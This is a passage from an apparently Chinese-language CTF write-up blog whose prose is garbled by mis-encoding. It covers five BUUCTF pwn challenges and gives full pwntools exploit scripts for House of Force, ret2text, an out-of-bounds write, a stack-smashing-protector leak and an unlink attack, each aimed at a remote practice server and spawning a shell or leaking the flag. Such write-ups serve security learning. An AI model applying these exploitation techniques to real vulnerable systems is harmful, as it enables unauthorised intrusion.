<p>åªæœ‰ä¸€ä¸ªåˆ†é…å †å—çš„åŠŸèƒ½ï¼Œä¸é™åˆ¶å¤§å°ï¼Œä¼šç»™å‡ºå †å—åœ°å€ï¼Œæœ€å¤šå†™å…¥ <code>0x50</code> å­—èŠ‚ï¼Œè‹¥æ˜¯åˆ†é…å°å †å—åˆ™æ¯«æ— ç–‘é—®å¯ä»¥æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/05/03/ND1y5ezRKtEP6X8.png" alt="image.png"></p>
<p>æ²¡æœ‰ free åŠŸèƒ½ï¼Œä¹Ÿæ²¡æ³•æ‰“å°ï¼Œå”¯ä¸€çš„è¾“å‡ºç‚¹æ˜¯è¾“å‡ºå †å—çš„åœ°å€ï¼Œç”±äºå…¶ä¸é™åˆ¶ size çš„å¤§å°ï¼Œä¸éš¾æƒ³åˆ°è‹¥æ˜¯æˆ‘ä»¬åˆ†é…ä¸€ä¸ªç‰¹åˆ«å¤§çš„ chunk ï¼Œsys_malloc ä¾¿ä¼šé€šè¿‡ MMAP ç³»ç»Ÿè°ƒç”¨åˆ†é…ä¸€å—ç©ºé—´ï¼Œ<strong>åˆšå¥½æŒ¨ç€ libc æ˜ å°„çš„ç©ºé—´</strong>ï¼Œç”±æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥è·å¾— libc çš„åœ°å€</p>
<p>æœ‰æº¢å‡ºï¼Œlibc 2.23 ï¼Œå¯ä»¥è€ƒè™‘é€šè¿‡ House of Force åŠ«æŒ top chunk è¿›è¡Œä»»æ„åœ°å€å†™æ”¹ __malloc_hook ä¸º one_gadgetï¼Œä»¥åŠåˆ«å¿˜äº† realloc è°ƒæ ˆ</p>
<p>exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./gyctf_2020_force&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25534</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;2:puts&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;bin addr &quot;</span>)</span><br><span class="line">    chunk_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;content&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    <span class="keyword">return</span> chunk_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    libc_leak = new(<span class="number">0x2000000</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    libc_base = libc_leak - <span class="number">0x10</span> + <span class="number">0x2000000</span> + <span class="number">0x1000</span> <span class="comment"># chunk header</span></span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    heap_leak = new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xfffffffffffffff1</span>))</span><br><span class="line">    top_chunk = heap_leak + <span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">&#x27;top chunk: &#x27;</span> + <span class="built_in">hex</span>(top_chunk))</span><br><span class="line"></span><br><span class="line">    new(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - top_chunk - <span class="number">0x30</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span> + p64(libc_base + <span class="number">0x4526a</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>] + <span class="number">0x10</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;2:puts&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/03/hG4lYofbJRq7aKr.png" alt="image.png"></p>
<h2 id="0x060-suctf-2018-basic-pwn-ret2text-ret2csu"><a href="#0x060-suctf-2018-basic-pwn-ret2text-ret2csu" class="headerlink" title="0x060.suctf_2018_basic pwn - ret2text + ret2csu"></a>0x060.suctf_2018_basic pwn - ret2text + ret2csu</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code>ï¼Œå¼€äº† NX å’Œ RELRO</p>
<p><img src="https://i.loli.net/2021/05/03/IEVQ3PTSmhp61cH.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æï¼Œç›´æ¥å°±æœ‰ä¸ªå¾ˆå¤§çš„æº¢å‡º</p>
<p><img src="https://i.loli.net/2021/05/03/TUW8FzcrbGpHexA.png" alt="image.png"></p>
<p>æœ‰ä¸ªæ‹¿flagçš„åé—¨ï¼Œç›´æ¥ ret2text</p>
<p><img src="https://i.loli.net/2021/05/03/BZdXgjl1bsyS2Vr.png" alt="image.png"></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./SUCTF_2018_basic_pwn&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26176</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x110</span></span><br><span class="line">pop_rdi_ret = e.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x401157</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get flag</p>
<p><img src="https://i.loli.net/2021/05/03/RwKjrXec9pPlLWB.png" alt="image.png"></p>
<h1 id="0x061-0x070"><a href="#0x061-0x070" class="headerlink" title="0x061 ~ 0x070"></a>0x061 ~ 0x070</h1><blockquote>
<p>æ­£å¼è¿›å…¥ç¬¬å››é¡µå•¦ï¼</p>
</blockquote>
<h2 id="0x061-wustctf2020-name-your-cat-write-out-of-bound"><a href="#0x061-wustctf2020-name-your-cat-write-out-of-bound" class="headerlink" title="0x061.wustctf2020_name_your_cat - write out of bound"></a>0x061.wustctf2020_name_your_cat - write out of bound</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œå¼€äº† NX å’Œ canary</p>
<p><img src="https://i.loli.net/2021/05/03/ep9Ha7D1Ux8rWbJ.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>å­˜åœ¨æ•°ç»„è¶Šç•Œ</p>
<p><img src="https://i.loli.net/2021/05/03/Au2XNjzYTCp8bgQ.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/05/03/q9iJsW1v6VNlgYM.png" alt="image.png"></p>
<p>ç»™äº†ä¸ªåé—¨</p>
<p><img src="https://i.loli.net/2021/05/03/Q1CZxgdrlqpVans.png" alt="image.png"></p>
<p>æ”¹ main çš„è¿”å›åœ°å€ä¸ºåé—¨å³å¯</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./wustctf2020_name_your_cat&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29927</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Give your name plz: &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        new(<span class="number">7</span>, p32(<span class="number">0x80485CB</span>))</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/03/67yrJh4mMEcSNU8.png" alt="image.png"></p>
<h2 id="0x062-wdb2018-guess-Stack-Smashing-Protect-leak"><a href="#0x062-wdb2018-guess-Stack-Smashing-Protect-leak" class="headerlink" title="0x062.wdb2018_guess - Stack Smashing Protect leak"></a>0x062.wdb2018_guess - Stack Smashing Protect leak</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œå¼€äº† NX å’Œ canary</p>
<p><img src="https://i.loli.net/2021/05/03/jNPlIGzZ7uxVDLn.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>æœ‰ gets()ï¼Œæœ‰ä¸ª fork() å¯ä»¥è¾“å…¥ä¸‰æ¬¡ï¼Œä½†æ˜¯æ²¡æœ‰å¸¸è§„çš„è¾“å‡ºï¼Œä¼¼ä¹æ²¡æ³•ç›´æ¥ç»•canary</p>
<p><img src="https://i.loli.net/2021/05/03/zroSDdaZ85CXk7e.png" alt="image.png"></p>
<p>æ—¢ç„¶ flag å·²ç»è¢«è¯»åˆ°æ ˆä¸Šäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æƒ³åŠæ³•æŠŠ flag ç»™è¾“å‡ºå‡ºæ¥</p>
<p>è€ƒè™‘åˆ° <code>__stack_chk_fail()</code> çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// debug/stack_chk_fail.c</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__attribute__ ((<span class="keyword">noreturn</span>))</span><br><span class="line">__stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail_abort (<span class="literal">false</span>, <span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">strong_alias (__stack_chk_fail, __stack_chk_fail_local)</span><br><span class="line"></span><br><span class="line"><span class="comment">// debug/fortify_fail.c</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line">__attribute__ ((<span class="keyword">noreturn</span>))</span><br><span class="line">__fortify_fail_abort (<span class="type">_Bool</span> need_backtrace, <span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  Don&#x27;t pass down</span></span><br><span class="line"><span class="comment">     __libc_argv[0] if we aren&#x27;t doing backtrace since __libc_argv[0]</span></span><br><span class="line"><span class="comment">     may point to the corrupted stack.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,</span><br><span class="line">		    <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">		    msg,</span><br><span class="line">		    (need_backtrace &amp;&amp; __libc_argv[<span class="number">0</span>] != <span class="literal">NULL</span></span><br><span class="line">		     ? __libc_argv[<span class="number">0</span>] : <span class="string">&quot;&lt;unknown&gt;&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“ <code>__libc_argv[0]</code> ä¸ä¸º NULL æ—¶ä¼šä½œä¸ºå­—ç¬¦ä¸²è¿›è¡Œè¾“å‡º</p>
<p>åŠ¨æ€è°ƒè¯•å¯ä»¥å‘ç°å…¶ä½äºæ ˆä¸Šï¼Œä¸éš¾æƒ³åˆ°æˆ‘ä»¬å¯ä»¥é€šè¿‡æº¢å‡ºå°†å…¶è¦†ç›–ï¼Œä»¥æ³„æ¼å‡ºæˆ‘ä»¬æ‰€éœ€è¦çš„æ•°æ®ï¼›å…¶åç§»åŒæ ·å¯ä»¥é€šè¿‡åŠ¨æ€è°ƒè¯•è·å¾—ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯åº”å½“ä½¿ç”¨ç›¸åŒç‰ˆæœ¬çš„ libc è¿›è¡Œè°ƒè¯•</p>
<p><img src="https://i.loli.net/2021/05/04/YZRozWTs5aGXxPr.png" alt="image.png"></p>
<p>ç”±äºä»…æœ‰ä¸‰æ¬¡è¾“å‡ºæœºä¼šï¼Œè€ƒè™‘ç¬¬ä¸€æ¬¡é€šè¿‡ got è¡¨æ³„æ¼å‡º libc åŸºå€ï¼Œç¬¬äºŒæ¬¡é€šè¿‡ <code>__environ</code> æ³„æ¼å‡ºæ ˆåœ°å€ï¼Œ<strong>æœ€åæ³„æ¼å‡ºflag</strong></p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./GUESS&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29134</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x128</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span> * offset + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span> * offset + p64(libc_base + libc.sym[<span class="string">&#x27;__environ&#x27;</span>]))</span><br><span class="line">stack_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;stack leak: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span> * offset + p64(stack_leak - <span class="number">0x168</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾— flag</p>
<p><img src="https://i.loli.net/2021/05/04/QBDcYzUbmptiwgI.png" alt="image.png"></p>
<h2 id="0x063-zctf2016-note2-Interger-Overflow-unlink"><a href="#0x063-zctf2016-note2-Interger-Overflow-unlink" class="headerlink" title="0x063.zctf2016_note2 - Interger Overflow + unlink"></a>0x063.zctf2016_note2 - Interger Overflow + unlink</h2><p>æƒ¯ä¾‹çš„ <code>checksec</code> ï¼Œåªå¼€äº† NX å’Œ canary</p>
<p><img src="https://i.loli.net/2021/05/08/CyMJlO6QFxIDVEi.png" alt="image.png"></p>
<p>æ‹–å…¥ IDA è¿›è¡Œåˆ†æ</p>
<p>å¤§æ¦‚æ˜¯æœ‰ç€åˆ›å»ºã€æ‰“å°ã€ç¼–è¾‘ã€é‡Šæ”¾å †å—çš„åŠŸèƒ½</p>
<p>é™åˆ¶äº†åªèƒ½å¤Ÿåˆ†é…å››ä¸ªå †å—ï¼Œå¤§å°åˆšå¥½å¡ 0x80 çš„çº¿ï¼Œå¯ä»¥æ‹¿åˆ° unsorted bin</p>
<p><img src="https://i.loli.net/2021/05/08/EfyYtJCm3ilM4Zj.png" alt="image.png"></p>
<p>æ¼æ´ç‚¹ä¸»è¦åœ¨äºå…¶è‡ªå®šä¹‰çš„è¯»å–è¾“å…¥çš„å‡½æ•°ä¸­ï¼Œåœ¨å¾ªç¯æ¯”è¾ƒä¸­çš„ i ä¸º unsigned ç±»å‹ï¼Œå› æ­¤æ¯”è¾ƒæ—¶ä¾¿ä¼šéƒ½è½¬ä¸º unsigned ç±»å‹è¿›è¡Œæ¯”è¾ƒï¼Œè‹¥æ˜¯ size ä¸º 0 åˆ™ size - 1 ä¼šå˜ä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œ<strong>å­˜åœ¨æº¢å‡º</strong></p>
<p><img src="https://i.loli.net/2021/05/08/HqKmWjLh8UNnEgw.png" alt="image.png"></p>
<p>åªèƒ½åˆ†é…å››ä¸ªå †å—ï¼Œç©ºé—´æ¯”è¾ƒç´§å¼ ï¼Œè€ƒè™‘ unlink åŠ«æŒæŒ‡é’ˆæ•°ç»„åé€šè¿‡ got è¡¨æ³„éœ² libc åæ”¹ free hook ä¸€å¥—å¸¦èµ°</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./note2&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28871</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;option---&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Input the length of the note content:(less than 128)&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Input the note content:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Input the id of the note:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content is &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, mode:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Input the id of the note:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;do you want to overwrite or append?[1.overwrite/2.append]&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(mode).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;TheNewContents:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Input the id of the note:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.sendline(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">1</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x602120</span> + <span class="number">8</span> - <span class="number">0x18</span>) + p64(<span class="number">0x602120</span> + <span class="number">8</span> - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x90</span>))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(e.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">1</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;arttnba3&#x27;</span> * <span class="number">2</span> + p64(libc_base + libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯ get shell</p>
<p><img src="https://i.loli.net/2021/05/08/KroQAfGF9Wk4Yv1.png" alt="image.png"></p>
